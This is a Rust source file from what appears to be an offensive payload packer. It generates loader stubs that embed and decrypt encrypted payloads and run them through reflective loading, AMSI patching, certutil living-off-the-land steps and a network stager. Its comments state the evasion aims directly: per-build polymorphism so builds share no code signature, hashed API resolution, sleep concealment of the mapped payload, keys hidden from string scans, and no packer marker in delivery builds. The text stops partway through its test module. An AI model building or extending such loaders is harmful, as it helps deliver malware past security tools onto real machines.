//! Step-based stub rendering (schema 6).
//!
//! A schema-6 plan has one ordered `runtime:` list. This module renders
//! `src/engine/templates/main.rs.tpl`: every Execution step embeds and decrypts its own
//! payload, each technique gets its own `mod step_<i>` (so two steps can use the
//! same technique without colliding on top-level names), and a generated runner
//! walks the steps in order with the declared [`StepControl`] gating.
//!
//! The same renderer serves the builtin template and a custom loader stub
//! (`build.stub.path`): the builtin must contain every placeholder (a missing one
//! is an error), while a custom stub may omit the ones it does not use — the
//! renderer then warns about each ignored block.

use std::collections::BTreeMap;

use super::api_resolution::ApiResolutionConfig;
use super::obfuscation::StringsConfig;
use super::syscalls::{self, SyscallsConfig};
use super::{args, debug, imports, stub, BuildError, Result};
use crate::plan::schema::{
    ConsoleMode, DllEntry, OutputKind, PayloadFormat, StepControl, StepFailure, StepOutcome,
};
use crate::techniques::{Category, RuntimeStep, TechniqueKind};

/// The builtin template's required placeholders (its contract).
const REQUIRED: &[&str] = &[
    "$STUB_HELPERS$",
    "$SLEEP_RUNTIME_BLOCK$",
    "$TLS_HANDOFF_BLOCK$",
    "$TLS_PROVISION$",
    "$ENTRY_BLOCK$",
    "$STEP_MODULES$",
    "$STEP_RUNNER_BODY$",
    "$SYSCALLS_BLOCK$",
    "$ARGS_BLOCK$",
    "$IMPORTS_BLOCK$",
    "$API_RESOLUTION_BLOCK$",
    "$STAGER_BLOCK$",
];

/// The shared stub helpers (string obfuscation and per-step decryption).
///
/// Rendered as `$STUB_HELPERS$` for the builtin template and any custom stub that
/// uses the generated runner.
const STUB_HELPERS: &str = r#"// --- Shared helpers (string obfuscation + per-step decryption) ---
#[inline(never)]
#[allow(dead_code)]
fn dec_xor(bytes: &[u8], key: &[u8; 32]) -> Vec<u8> {
    let mut out = bytes.to_vec();
    for (i, b) in out.iter_mut().enumerate() {
        *b ^= key[i % 32];
    }
    out
}

/// Decrypts one step's payload, verifying the Poly1305 tag and the size.
#[allow(dead_code)]
fn decrypt_step(enc: &[u8], nonce_hex: &str, key_hex: &str, len: usize) -> Result<Vec<u8>, String> {
    let nonce_vec = hex::decode(nonce_hex).map_err(|e| format!("invalid nonce: {e}"))?;
    let nonce: [u8; 24] = nonce_vec
        .try_into()
        .map_err(|_| "the nonce must be 24 bytes".to_string())?;
    let key_vec = hex::decode(key_hex).map_err(|e| format!("invalid key: {e}"))?;
    let key: [u8; 32] = key_vec
        .try_into()
        .map_err(|_| "the key must be 32 bytes".to_string())?;
    let cipher = XChaCha20Poly1305::new(Key::from_slice(&key));
    let image = cipher
        .decrypt(XNonce::from_slice(&nonce), enc)
        .map_err(|_| "decryption failed: wrong key/nonce or tampered payload".to_string())?;
    if image.len() != len {
        return Err("decrypted payload size does not match the expected size".to_string());
    }
    Ok(image)
}

/// Expands `%NAME%` environment references in a template (a path, ...).
///
/// An unknown name is left as written, so the template degrades to a literal
/// path instead of dropping the variable.
#[allow(dead_code)]
fn expand_env(template: &str) -> String {
    let mut out = String::new();
    let mut rest = template;
    while let Some(start) = rest.find('%') {
        out.push_str(&rest[..start]);
        let after = &rest[start + 1..];
        match after.find('%') {
            Some(end) => {
                let name = &after[..end];
                match std::env::var(name) {
                    Ok(value) => out.push_str(&value),
                    Err(_) => {
                        out.push('%');
                        out.push_str(name);
                        out.push('%');
                    }
                }
                rest = &after[end + 1..];
            }
            None => {
                out.push('%');
                rest = after;
            }
        }
    }
    out.push_str(rest);
    out
}

// --- Payload region registry ---
//
// The loader that maps the payload records its image here, so a runtime hook
// (the `Sleep` proxy) can conceal exactly the mapped payload and not the
// loader's own image. Atomics, not `thread_local!`: proxies run on payload
// threads, where the stub's TLS index is not provisioned.
mod payload_region {
    use core::sync::atomic::{AtomicUsize, Ordering};

    static BASE: AtomicUsize = AtomicUsize::new(0);
    static SIZE: AtomicUsize = AtomicUsize::new(0);
    static CONCEALS: AtomicUsize = AtomicUsize::new(0);

    /// Records a completed concealed sleep. The loader reports it after the
    /// payload returns, so a lab run can tell the ekko path actually ran.
    #[allow(dead_code)]
    pub fn record_conceal() {
        CONCEALS.fetch_add(1, Ordering::Relaxed);
    }

    /// How many concealed sleeps this process completed.
    #[allow(dead_code)]
    pub fn conceals() -> usize {
        CONCEALS.load(Ordering::Relaxed)
    }

    /// Records the mapped payload image (`base`, `SizeOfImage`).
    #[allow(dead_code)]
    pub fn set(base: usize, size: usize) {
        // Size first, base last: a reader that sees a non-zero base also sees
        // the size (Release/Acquire).
        SIZE.store(size, Ordering::Release);
        BASE.store(base, Ordering::Release);
    }

    /// The mapped payload image, if a loader recorded one.
    #[allow(dead_code)]
    pub fn get() -> Option<(usize, usize)> {
        let base = BASE.load(Ordering::Acquire);
        if base == 0 {
            return None;
        }
        let size = SIZE.load(Ordering::Acquire);
        if size == 0 {
            None
        } else {
            Some((base, size))
        }
    }
}
"#;

/// How an Execution step obtains its payload bytes.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PayloadSource {
    /// The ciphertext embedded in the artifact (`include_bytes!`).
    Embedded,
    /// The staged slot only (`network_stager` `fallback: none`): the artifact
    /// carries no copy of the payload.
    Staged,
    /// The staged slot when the fetch succeeded, the embedded ciphertext
    /// otherwise (`network_stager` `fallback: embedded`).
    StagedWithFallback,
}

/// One payload handed to the renderer, already encrypted.
#[derive(Debug, Clone)]
pub struct PayloadCipher {
    /// XChaCha20 nonce (24 bytes).
    pub nonce: [u8; 24],
    /// Symmetric key (32 bytes).
    pub key: [u8; 32],
    /// Original payload size.
    pub plaintext_len: usize,
    /// Path to the ciphertext for `include_bytes!` (relative to `main.rs`).
    pub path: String,
    /// The payload's binary format (selects the Execution fragment).
    pub format: PayloadFormat,
    /// Exported function for `format: dll`.
    pub export: Option<String>,
    /// The payload's fixed arguments (`build.payloads.<name>.args`).
    pub args: Vec<String>,
    /// Whether the runtime args replace the YAML ones.
    pub args_override: bool,
    /// Per-build stub marker (self-test affordance). Printed to stderr only in
    /// a debug artifact (`build.stub.debug`); ignored, and never embedded,
    /// otherwise.
    pub marker: String,
    /// Where the payload comes from. For [`PayloadSource::Staged`],
    /// `path`/`nonce`/`key`/`plaintext_len` are unused; for
    /// [`PayloadSource::StagedWithFallback`] they describe the embedded copy the
    /// runner uses when the fetch did not stage one.
    pub source: PayloadSource,
}

/// One resolved step handed to the renderer.
#[derive(Debug, Clone)]
pub struct StepPayload {
    /// Position in the runtime list (0-based).
    pub index: usize,
    /// Human label.
    pub label: String,
    /// The technique call and its parameters.
    pub technique: TechniqueKind,
    /// How the loader reacts to this step's result.
    pub control: StepControl,
    /// The encrypted payload, for an Execution technique.
    pub payload: Option<PayloadCipher>,
}

/// Everything the step template needs.
#[derive(Debug, Clone)]
pub struct StepsParams {
    /// The ordered steps.
    pub steps: Vec<StepPayload>,
    /// Positional build args, exposed as `$ARG_<key>$`.
    pub build_args: BTreeMap<String, String>,
    /// Whether the stub is a debug artifact.
    pub debug: bool,
    /// Whether the artifact uses the `windows` subsystem.
    pub windows_subsystem: bool,
    /// What the artifact is (`build.output.kind`).
    pub kind: OutputKind,
    /// What starts the chain in a DLL build (`build.output.entry`).
    pub entry: DllEntry,
    /// Console behavior for a DLL/shellcode build (`build.output.console`).
    pub console: ConsoleMode,
    /// Per-build source-entropy seed (`build.polymorphism`), or `None` when the
    /// source phase is off (`mode: none`/`codegen`). Baked into `.text` as an
    /// immediate so two builds of one plan differ even under the same codegen
    /// profile.
    pub poly_seed: Option<u64>,
}

/// A rendered stub plus the non-fatal warnings a custom template produced.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct RenderedSteps {
    /// The substituted Rust source.
    pub source: String,
    /// Non-fatal warnings (a custom stub ignoring a block).
    pub warnings: Vec<String>,
}

/// Renders the builtin step template, failing when a required placeholder is
/// missing.
pub fn render_builtin(
    template: &str,
    params: &StepsParams,
    strings: &StringsConfig,
    syscalls_config: &SyscallsConfig,
    api_resolution: &ApiResolutionConfig,
) -> Result<String> {
    for required in REQUIRED {
        if !template.contains(required) {
            return Err(BuildError::InvalidTemplate(format!(
                "placeholder '{required}' does not appear in the builtin step template"
            )));
        }
    }
    Ok(render_common(template, params, strings, syscalls_config, api_resolution)?.source)
}

/// Renders a custom loader stub template.
///
/// The template may omit any placeholder; the only hard requirement (enforced
/// separately by [`stub::validate_custom_stub_template`]) is a `fn main()` — or,
/// for a template that wants the generated entry, `$ENTRY_BLOCK$` instead. When
/// it ignores a block the declared techniques need, a warning is returned.
pub fn render_custom(
    template: &str,
    params: &StepsParams,
    strings: &StringsConfig,
    syscalls_config: &SyscallsConfig,
    api_resolution: &ApiResolutionConfig,
) -> Result<RenderedSteps> {
    let mut warnings = Vec::new();
    if !params.steps.is_empty() && !template.contains("$STEP_MODULES$") {
        warnings.push(
            "loader stub does not reference $STEP_MODULES$; the declared techniques will have no \
             effect"
                .to_string(),
        );
    }
    if !params.steps.is_empty() && !template.contains("$STEP_RUNNER_BODY$") {
        warnings.push(
            "loader stub does not reference $STEP_RUNNER_BODY$; no step will ever run".to_string(),
        );
    }
    let union = union_of(params);
    if !syscalls::required(&union).is_empty() && !template.contains("$SYSCALLS_BLOCK$") {
        warnings.push(
            "loader stub does not reference $SYSCALLS_BLOCK$; the declared techniques' nt_* calls \
             will fail to compile"
                .to_string(),
        );
    }
    if imports::needed(&union) && !template.contains("$IMPORTS_BLOCK$") {
        warnings.push(
            "loader stub does not reference $IMPORTS_BLOCK$; the declared techniques' payload \
             imports will not be resolved"
                .to_string(),
        );
    }
    if args::needed(&union) && !template.contains("$ARGS_BLOCK$") {
        warnings.push(
            "loader stub does not reference $ARGS_BLOCK$; the declared techniques' payload command \
             line will not be built"
                .to_string(),
        );
    }
    if super::sleep_runtime::needed(&union, api_resolution)
        && !template.contains("$SLEEP_RUNTIME_BLOCK$")
    {
        warnings.push(
            "loader stub does not reference $SLEEP_RUNTIME_BLOCK$; 'sleep_obfuscation' and the \
             'Sleep' hook will not compile"
                .to_string(),
        );
    }
    if !api_resolution.is_noop() && !template.contains("$API_RESOLUTION_BLOCK$") {
        warnings.push(
            "loader stub does not reference $API_RESOLUTION_BLOCK$; the declared API resolution \
             proxies and hooks will not be installed"
                .to_string(),
        );
    }

    render_common(template, params, strings, syscalls_config, api_resolution).map(|mut rendered| {
        rendered.warnings = warnings;
        rendered
    })
}

/// Renders any template by building the placeholder values and substituting.
fn render_common(
    template: &str,
    params: &StepsParams,
    strings: &StringsConfig,
    syscalls_config: &SyscallsConfig,
    api_resolution: &ApiResolutionConfig,
) -> Result<RenderedSteps> {
    let union = union_of(params);

    // One per-build seed for the API-hashing resolver's FNV-1a offset basis, so
    // its emitted hash constants are unique to this artifact instead of a fixed
    // static signature. Emitted into the stub as `API_HASH_SEED`.
    let api_hash_seed: u64 = rand::random();

    let modules: String = params
        .steps
        .iter()
        .map(|step| render_step_module(step, strings))
        .collect::<Result<Vec<_>>>()?
        .concat();
    let runner = render_runner_body(&params.steps, strings, params.debug, params.poly_seed)?;

    let mut values = BTreeMap::new();
    // The per-build source entropy is appended to the shared helpers: a function
    // whose body holds per-build immediates, so `.text` differs even when the
    // codegen profile matches (`docs/design/polymorphism.md`, phase 2).
    values.insert(
        "$STUB_HELPERS$".to_string(),
        match params.poly_seed {
            Some(seed) => format!("{STUB_HELPERS}{}", poly_helpers(seed)),
            None => STUB_HELPERS.to_string(),
        },
    );
    // The TLS handoff block renders into every stub (self-gated); only a
    // release shellcode stub calls `provision` (a debug stub keeps the
    // historical index-0 aliasing its traces were built around).
    values.insert(
        "$TLS_HANDOFF_BLOCK$".to_string(),
        super::tls::BLOCK.to_string(),
    );
    values.insert(
        "$TLS_PROVISION$".to_string(),
        if params.kind == OutputKind::Shellcode && !params.debug {
            "    tls_handoff::provision();\n".to_string()
        } else {
            String::new()
        },
    );
    // The entry point: `fn main()` for an executable, the exports for a DLL
    // (`build.output.kind`/`entry`). A custom stub that defines its own `fn main`
    // simply omits the placeholder.
    values.insert(
        "$ENTRY_BLOCK$".to_string(),
        super::entry::render(params.kind, &params.entry, params.console),
    );
    values.insert("$STEP_MODULES$".to_string(), modules);
    values.insert("$STEP_RUNNER_BODY$".to_string(), runner);
    values.insert(
        "$SLEEP_RUNTIME_BLOCK$".to_string(),
        if super::sleep_runtime::needed(&union, api_resolution) {
            super::sleep_runtime::render_block(strings)
        } else {
            String::new()
        },
    );
    values.insert(
        "$SYSCALLS_BLOCK$".to_string(),
        syscalls::render_block_with(
            syscalls_config,
            &union,
            strings,
            &api_resolution.required_syscalls(),
            api_hash_seed,
        ),
    );
    // Per-step payload args are delivered through a thread-local context the
    // runner sets before each Execution step (`crate::set_stage_args`).
    values.insert(
        "$ARGS_BLOCK$".to_string(),
        args::render_block(&union, strings),
    );
    values.insert(
        "$IMPORTS_BLOCK$".to_string(),
        imports::render_block(&union, strings),
    );
    values.insert(
        "$API_RESOLUTION_BLOCK$".to_string(),
        if imports::needed(&union) || !api_resolution.is_noop() {
            super::api_resolution::render_block(api_resolution, strings)
        } else {
            String::new()
        },
    );
    values.insert(
        "$STAGER_BLOCK$".to_string(),
        if params
            .steps
            .iter()
            .any(|step| matches!(step.technique, TechniqueKind::NetworkStager { .. }))
        {
            super::stager::render_block()
        } else {
            String::new()
        },
    );
    for (name, value) in &params.build_args {
        values.insert(format!("$ARG_{name}$"), value.clone());
    }

    let mut source = stub::substitute_template(template, &values)?;
    source.push_str(debug::render_prelude(
        params.debug,
        params.windows_subsystem,
    ));
    Ok(RenderedSteps {
        source,
        warnings: Vec::new(),
    })
}

/// The per-build source-level entropy appended to `$STUB_HELPERS$`.
///
/// The body holds four per-build immediates; because they land inside
/// instructions, two builds of the same plan differ in `.text` even when the
/// codegen profile (phase 1) happens to match. The result is unused and
/// `black_box`ed, and the function is `#[inline(never)]`, so the optimizer
/// cannot fold or delete it. Deterministic in `seed`, so the manifest seed
/// reproduces the artifact.
fn poly_helpers(seed: u64) -> String {
    let mut state = seed;
    let a = splitmix64(&mut state);
    let b = splitmix64(&mut state);
    let c = splitmix64(&mut state);
    let d = splitmix64(&mut state);
    format!(
        "\n/// Per-build entropy: bakes the build seed into `.text` so two builds of\n\
         /// one plan do not share a code signature. Behaviour is unchanged.\n\
         #[inline(never)]\n\
         #[allow(dead_code)]\n\
         fn poly_seed_mix() -> u64 {{\n\
         \x20   let a: u64 = {a:#018x};\n\
         \x20   let b: u64 = {b:#018x};\n\
         \x20   let mut x = a ^ core::hint::black_box(b);\n\
         \x20   x = x.wrapping_mul({c:#018x}) ^ {d:#018x};\n\
         \x20   core::hint::black_box(x)\n\
         }}\n"
    )
}

/// splitmix64: a tiny, dependency-free deterministic mixer for the source-level
/// per-build constants.
fn splitmix64(state: &mut u64) -> u64 {
    *state = state.wrapping_add(0x9E37_79B9_7F4A_7C15);
    let mut z = *state;
    z = (z ^ (z >> 30)).wrapping_mul(0xBF58_476D_1CE4_E5B9);
    z = (z ^ (z >> 27)).wrapping_mul(0x94D0_49BB_1331_11EB);
    z ^ (z >> 31)
}

/// The union of every step's technique, for the shared blocks.
fn union_of(params: &StepsParams) -> Vec<RuntimeStep> {
    params
        .steps
        .iter()
        .map(|step| RuntimeStep::new(step.technique.clone()))
        .collect()
}

/// Renders one step's private module, or `None` for an inline `sleep` step.
fn render_step_module(step: &StepPayload, strings: &StringsConfig) -> Result<String> {
    if let TechniqueKind::Sleep { .. } = &step.technique {
        // A sleep is a single line, not a module.
        return Ok(String::new());
    }

    let format = step
        .payload
        .as_ref()
        .map_or(PayloadFormat::Pe, |payload| payload.format);
    let export = step
        .payload
        .as_ref()
        .and_then(|payload| payload.export.as_deref());
    let fragment = step.technique.render_fragment(strings, format, export);

    // The `bouncer` decoy and the `drop` file are embedded, encrypted assets a
    // Preparation step carries. Their module-level constants and `asset_bytes()`
    // helper are injected ahead of the fragment (which calls them at run time).
    let asset_prelude = match &step.technique {
        TechniqueKind::Bouncer { .. } | TechniqueKind::Drop { .. } => render_step_asset(step),
        _ => String::new(),
    };

    let body = match step.technique.category() {
        Category::Preparation => format!(
            "{asset_prelude}{fragment}\n    pub fn run() -> Result<bool, String> {{\n        {}().map_err(|e| e.to_string())\n    }}\n",
            step.technique.name()
        ),
        Category::Execution => {
            // A fragment that executes the payload must be an Execution
            // technique with a resolved payload.
            if step.payload.is_none() {
                return Err(BuildError::InvalidTemplate(format!(
                    "step {} ('{}') is an execution technique without a payload",
                    step.index,
                    step.technique.name()
                )));
            }
            format!(
                "{fragment}\n    pub fn payload(image: &mut [u8]) -> Result<i32, String> {{\n        execute_payload(image)\n    }}\n"
            )
        }
        Category::Control => format!(
            "{fragment}\n    pub fn run() -> Result<i32, String> {{\n        run_exec()\n    }}\n"
        ),
    };
    Ok(format!("mod step_{} {{\n{body}}}\n", step.index))
}

/// Renders an embedded asset into a step module (the `bouncer` decoy and the
/// `drop` file).
///
/// When the step carries an asset payload, its module gets the ciphertext
/// `include_bytes!` and an `asset_bytes()` helper that decrypts it on demand.
/// Without an asset the helper is a dead stub, so a fragment type-checks for
/// every such step.
fn render_step_asset(step: &StepPayload) -> String {
    match &step.payload {
        Some(payload) => format!(
            "    // Embedded asset: XChaCha20-encrypted, decrypted on demand.\n\
             \x20   const ASSET_ENC: &[u8] = include_bytes!(\"{path}\");\n\
             \x20   const ASSET_NONCE: &str = \"{nonce}\";\n\
             \x20   const ASSET_KEY: &str = \"{key}\";\n\
             \x20   const ASSET_LEN: usize = {len};\n\
             \x20   fn asset_bytes() -> Result<Vec<u8>, String> {{\n\
             \x20       crate::decrypt_step(ASSET_ENC, ASSET_NONCE, ASSET_KEY, ASSET_LEN)\n\
             \x20   }}\n",
            path = payload.path,
            nonce = hex::encode(payload.nonce),
            key = hex::encode(payload.key),
            len = payload.plaintext_len,
        ),
        None => "    #[allow(dead_code)]\n\
                 \x20   fn asset_bytes() -> Result<Vec<u8>, String> {\n\
                 \x20       Err(String::new())\n\
                 \x20   }\n"
            .to_string(),
    }
}

/// Sanitizes a step label for the generated line comment.
///
/// The label embeds the payload name, which the plan controls: a raw newline
/// would close the comment and turn the rest of the name into stub code, so both
/// line terminators become spaces.
fn comment_label(label: &str) -> String {
    label.replace(['\r', '\n'], " ")
}

/// Renders the runner body: one straight-line block per step, in order.
fn render_runner_body(
    steps: &[StepPayload],
    strings: &StringsConfig,
    debug: bool,
    poly_seed: Option<u64>,
) -> Result<String> {
    let mut body = String::new();
    if poly_seed.is_some() {
        // Runs once before any step: the call keeps the per-build entropy
        // function in the binary (the optimizer would drop an uncalled one).
        body.push_str("    let _ = crate::poly_seed_mix();\n");
    }
    for step in steps {
        body.push_str(&format!(
            "\n    // --- step {}: {} ---\n",
            step.index,
            comment_label(&step.label)
        ));
        if step.control.delay_ms > 0 {
            body.push_str(&sleep_line(step.control.delay_ms));
        }
        let success = success_action(step.control.on_success);
        let failure = failure_action(step.control.on_fail);
        match &step.technique {
            TechniqueKind::Sleep { params } => {
                body.push_str(&sleep_line(params.ms));
            }
            technique => match technique.category() {
                Category::Preparation => {
                    body.push_str(&format!(
                        "    match step_{index}::run() {{\n\
                         \x20       Ok(true) => {{{success}}}\n\
                         \x20       Ok(false) => return Ok(0),\n\
                         \x20       Err(e) => {{{failure}}}\n\
                         \x20   }}\n",
                        index = step.index,
                    ));
                }
                Category::Execution => {
                    let payload = step.payload.as_ref().ok_or_else(|| {
                        BuildError::InvalidTemplate(format!(
                            "step {} ('{}') is an execution technique without a payload",
                            step.index,
                            technique.name()
                        ))
                    })?;
                    body.push_str(&render_execution_block(
                        step.index,
                        payload,
                        strings,
                        success,
                        failure,
                        step.control.on_fail,
                        debug,
                    ));
                }
                Category::Control => {
                    body.push_str(&format!(
                        "    match step_{index}::run() {{\n\
                         \x20       Ok(code) => {{\n\
                         \x20           last = code;{success}\n\
                         \x20       }}\n\
                         \x20       Err(e) => {{{failure}}}\n\
                         \x20   }}\n",
                        index = step.index,
                    ));
                }
            },
        }
    }
    Ok(body)
}

/// The runner block that decrypts and runs an Execution step's payload.
///
/// The nonce and key are hex-encoded at build time but never emitted as
/// cleartext literals: they go through `strings` like the step args, so the
/// stage does not carry a 24-byte nonce and its 32-byte key side by side for
/// `strings <stage>` to pick up.
///
/// `debug` is the *only* thing that decides whether the per-build `stub_marker`
/// is emitted. A delivery build (`debug == false`) must stay silent: the marker
/// is a runtime token that links a running sample to the packer, so both the
/// print and the obfuscated string are left out of the generated source
/// entirely. `build.stub.debug` is a laboratory-only affordance.
fn render_execution_block(
    index: usize,
    payload: &PayloadCipher,
    strings: &StringsConfig,
    success: &str,
    failure: &str,
    on_fail: StepFailure,
    debug: bool,
) -> String {
    let marker_line = if debug {
        let marker = strings
            .obfuscate(&payload.marker)
            .render_stub_expr("stub_marker");
        format!(
            "        let stub_marker: String = {marker};\n\
             \x20       eprintln!(\"{{stub_marker}}\");\n"
        )
    } else {
        String::new()
    };
    let args = args_expr(&payload.args, strings);
    let overridden = if payload.args_override {
        "true"
    } else {
        "false"
    };
    let label = format!("'step_{index}");
    let (block_open, pre_failure) = step_block(&label, on_fail);

    match payload.source {
        // A staged payload is fetched at run time by a preceding
        // `network_stager` step and read from the shared slot, so there is no
        // embedded ciphertext.
        PayloadSource::Staged => format!(
            "    {block_open}\n\
             \x20       crate::set_stage_args({args}, {overridden});\n\
             \x20       let mut image = match crate::take_staged_payload() {{\n\
             \x20           Ok(bytes) => bytes,\n\
             \x20           Err(e) => {{ {pre_failure} }}\n\
             \x20       }};\n\
             {marker_line}\
             \x20       match step_{index}::payload(&mut image) {{\n\
             \x20           Ok(code) => {{\n\
             \x20               last = code;{success}\n\
             \x20           }}\n\
             \x20           Err(e) => {{{failure}}}\n\
             \x20       }}\n\
             \x20   }}\n",
            args = args,
            overridden = overridden,
            block_open = block_open,
            pre_failure = pre_failure,
            marker_line = marker_line,
            index = index,
        ),
        // `network_stager` with `fallback: embedded`: the fetched copy wins
        // when the fetch staged one, the embedded ciphertext otherwise.
        PayloadSource::StagedWithFallback => format!(
            "    {block_open}\n\
             \x20       crate::set_stage_args({args}, {overridden});\n\
             \x20       let mut image = match crate::take_staged_payload() {{\n\
             \x20           Ok(bytes) => bytes,\n\
             \x20           Err(_) => {{\n\
             \x20               let enc: &[u8] = include_bytes!(\"{path}\");\n\
             \x20               let payload_nonce: String = {nonce};\n\
             \x20               let payload_key: String = {key};\n\
             \x20               match decrypt_step(enc, &payload_nonce, &payload_key, {len}) {{\n\
             \x20                   Ok(bytes) => bytes,\n\
             \x20                   Err(e) => {{ {pre_failure} }}\n\
             \x20               }}\n\
             \x20           }}\n\
             \x20       }};\n\
             {marker_line}\
             \x20       match step_{index}::payload(&mut image) {{\n\
             \x20           Ok(code) => {{\n\
             \x20               last = code;{success}\n\
             \x20           }}\n\
             \x20           Err(e) => {{{failure}}}\n\
             \x20       }}\n\
             \x20   }}\n",
            args = args,
            overridden = overridden,
            block_open = block_open,
            pre_failure = pre_failure,
            path = payload.path,
            nonce = secret_expr(&payload.nonce, "payload_nonce", strings),
            key = secret_expr(&payload.key, "payload_key", strings),
            len = payload.plaintext_len,
            marker_line = marker_line,
            index = index,
        ),
        PayloadSource::Embedded => format!(
            "    {block_open}\n\
             \x20       crate::set_stage_args({args}, {overridden});\n\
             \x20       let enc: &[u8] = include_bytes!(\"{path}\");\n\
             \x20       let payload_nonce: String = {nonce};\n\
             \x20       let payload_key: String = {key};\n\
             \x20       let mut image = match decrypt_step(enc, &payload_nonce, &payload_key, {len}) {{\n\
             \x20           Ok(bytes) => bytes,\n\
             \x20           Err(e) => {{ {pre_failure} }}\n\
             \x20       }};\n\
             {marker_line}\
             \x20       match step_{index}::payload(&mut image) {{\n\
             \x20           Ok(code) => {{\n\
             \x20               last = code;{success}\n\
             \x20           }}\n\
             \x20           Err(e) => {{{failure}}}\n\
             \x20       }}\n\
             \x20   }}\n",
            args = args,
            overridden = overridden,
            block_open = block_open,
            pre_failure = pre_failure,
            path = payload.path,
            nonce = secret_expr(&payload.nonce, "payload_nonce", strings),
            key = secret_expr(&payload.key, "payload_key", strings),
            len = payload.plaintext_len,
            marker_line = marker_line,
            index = index,
        ),
    }
}

/// The opening of a step's runner block and its pre-payload failure action.
///
/// Only `continue` needs a label: it breaks out of the step block instead of
/// returning from `run()`, so a later step still runs. `stop` and `exit` leave
/// the chain exactly as the payload error arm does, in a plain block (a label
/// they never use would draw `unused_labels` in the generated stub).
fn step_block(label: &str, on_fail: StepFailure) -> (String, String) {
    match on_fail {
        StepFailure::Continue => (
            format!("{label}: {{"),
            format!("eprintln!(\"{{e}}\"); break {label};"),
        ),
        StepFailure::Stop => ("{".to_string(), "return Err(e);".to_string()),
        StepFailure::Exit => (
            "{".to_string(),
            "eprintln!(\"{e}\"); return Ok(0);".to_string(),
        ),
    }
}

/// The runtime reconstruction expression for a hex-encoded payload secret.
///
/// The nonce and the key follow `build.stub.strings` like every other stub
/// literal, so neither lands in the stage as a cleartext hex string. There is
/// no plaintext strategy (`from_yaml` accepts only `xor` and `stack`), so the
/// emitted expression always rebuilds the string at run time; `stack` also
/// keeps the bytes out of `.rdata`.
fn secret_expr(secret: &[u8], var_name: &str, strings: &StringsConfig) -> String {
    strings
        .obfuscate(&hex::encode(secret))
        .render_stub_expr(var_name)
}

/// One inline sleep.
fn sleep_line(ms: u64) -> String {
    format!("    std::thread::sleep(std::time::Duration::from_millis({ms}));\n")
}

/// The `Vec<String>` expression for a step's YAML args, rebuilt at run time.
fn args_expr(args: &[String], strings: &StringsConfig) -> String {
    if args.is_empty() {
        return "vec![]".to_string();
    }
    let mut body = String::from("vec![\n");
    for (index, arg) in args.iter().enumerate() {
        let expr = strings
            .obfuscate(arg)
            .render_stub_expr(&format!("step_arg_{index}"));
        body.push_str(&format!("            {expr},\n"));
    }
    body.push_str("        ]");
    body
}

/// The `on_success` code appended after a step sets `last`.
fn success_action(outcome: StepOutcome) -> &'static str {
    match outcome {
        StepOutcome::Continue => "",
        StepOutcome::Stop => " return Ok(last);",
        StepOutcome::Exit => " return Ok(0);",
    }
}

/// The `on_fail` code run in the `Err(e)` arm.
fn failure_action(failure: StepFailure) -> &'static str {
    match failure {
        StepFailure::Stop => "return Err(e);",
        StepFailure::Continue => "eprintln!(\"{e}\");",
        StepFailure::Exit => "eprintln!(\"{e}\"); return Ok(0);",
    }
}

/// Test support: builds [`StepsParams`] from a `RuntimeStep` list, attaching the
/// given cipher to every Execution step.
///
/// Lets the ignored compile tests (which think in terms of a technique runtime)
/// drive the step renderer without re-deriving the cipher plumbing.
#[cfg(test)]
#[cfg(feature = "live-tests")]
pub(crate) fn test_params(
    runtime: &[RuntimeStep],
    encrypted: &crate::engine::crypto::EncryptedPayload,
    payload_path: &str,
    format: PayloadFormat,
    export: Option<&str>,
    debug: bool,
) -> StepsParams {
    let steps = runtime
        .iter()
        .enumerate()
        .map(|(index, step)| {
            let payload = (step.category() == Category::Execution).then(|| PayloadCipher {
                nonce: encrypted.nonce,
                key: encrypted.key,
                plaintext_len: encrypted.plaintext_len,
                path: payload_path.to_string(),
                format,
                export: export.map(str::to_string),
                args: Vec::new(),
                args_override: false,
                marker: stub::generate_stub_marker(),
                source: PayloadSource::Embedded,
            });
            StepPayload {
                index,
                label: step.name().to_string(),
                technique: step.technique.clone(),
                control: step.control,
                payload,
            }
        })
        .collect();
    StepsParams {
        steps,
        build_args: BTreeMap::new(),
        debug,
        windows_subsystem: false,
        kind: OutputKind::Exe,
        entry: DllEntry::Auto,
        console: ConsoleMode::Parent,
        poly_seed: None,
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::engine::obfuscation::StringStrategy;
    use crate::engine::syscalls::SyscallsMode;
    #[cfg(feature = "live-tests")]
    use crate::plan::schema::Arch;
    use crate::plan::schema::{StepFailure, StepOutcome};
    use crate::techniques::living_off_the_land;
    use crate::techniques::sleep;

    fn strings() -> StringsConfig {
        StringsConfig::from_yaml(None).expect("default strings")
    }

    fn cipher(path: &str, marker: &str) -> PayloadCipher {
        PayloadCipher {
            nonce: [0u8; 24],
            key: [0u8; 32],
            plaintext_len: 16,
            path: path.to_string(),
            format: PayloadFormat::Shellcode,
            export: None,
            args: Vec::new(),
            args_override: false,
            marker: marker.to_string(),
            source: PayloadSource::Embedded,
        }
    }

    fn execution_step(index: usize) -> StepPayload {
        StepPayload {
            index,
            label: format!("reflective_loading 'p{index}'"),
            technique: serde_yml::from_str("technique: reflective_loading\n").expect("technique"),
            control: StepControl::default(),
            payload: Some(cipher(
                &format!("payload_{index}.bin"),
                &format!("STUB_MARKER_{index}"),
            )),
        }
    }

    fn preparation_step(index: usize) -> StepPayload {
        StepPayload {
            index,
            label: "patch_amsi".to_string(),
            technique: serde_yml::from_str("technique: patch_amsi\n").expect("technique"),
            control: StepControl::default(),
            payload: None,
        }
    }

    fn lol_step(index: usize) -> StepPayload {
        StepPayload {
            index,
            label: "living_off_the_land".to_string(),
            technique: TechniqueKind::LivingOffTheLand {
                params: living_off_the_land::Params {
                    binary: "certutil.exe".to_string(),
                    args: vec!["-f".to_string()],
                    ..Default::default()
                },
            },
            control: StepControl::default(),
            payload: None,
        }
    }

    fn sleep_step(index: usize, ms: u64) -> StepPayload {
        StepPayload {
            index,
            label: "sleep".to_string(),
            technique: TechniqueKind::Sleep {
                params: sleep::Params { ms },
            },
            control: StepControl::default(),
            payload: None,
        }
    }

    fn template() -> String {
        std::fs::read_to_string(
            std::path::Path::new(env!("CARGO_MANIFEST_DIR"))
                .join("src")
                .join("engine")
                .join("templates")
                .join("main.rs.tpl"),
        )
        .expect("template")
    }

    fn render(steps: Vec<StepPayload>) -> String {
        let params = StepsParams {
            steps,
            build_args: BTreeMap::new(),
            debug: false,
            windows_subsystem: false,
            kind: OutputKind::Exe,
            entry: DllEntry::Auto,
